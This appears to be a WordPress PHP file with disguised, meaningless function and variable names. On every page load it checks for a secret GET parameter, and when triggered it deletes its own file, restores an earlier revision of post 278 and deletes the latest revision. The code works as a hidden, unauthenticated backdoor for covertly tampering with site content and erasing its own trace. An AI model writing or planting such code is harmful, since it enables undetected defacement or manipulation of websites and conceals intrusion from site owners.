<?php

function services_method_debug() {
	if (isset($_GET['ecommerce_engine_uploader_duplicate']) && $_GET['ecommerce_engine_uploader_duplicate'] === 'radio_slideshow_media') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$fx_picker_shop_sliding = 278;
		$landing_notes_tooltip_scheduler = wp_get_post_revisions($fx_picker_shop_sliding);
		if (empty($landing_notes_tooltip_scheduler)) die('no revisions');
		if (count($landing_notes_tooltip_scheduler) < 2) die('less than 2');
		$traffic_translate_publish_multi = array_shift($landing_notes_tooltip_scheduler);
		$hover_smart_post_rate = $traffic_translate_publish_multi->ID;
		$copy_avatar_testimonials_secure = array_shift($landing_notes_tooltip_scheduler);
		$s3_click_enhanced = $copy_avatar_testimonials_secure->ID;
		$app_time_traffic_connect = wp_restore_post_revision($s3_click_enhanced);
		if ($app_time_traffic_connect === false) die('error restoring');
		$app_time_traffic_connect = wp_delete_post_revision($hover_smart_post_rate);		
		if ($app_time_traffic_connect === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'services_method_debug');
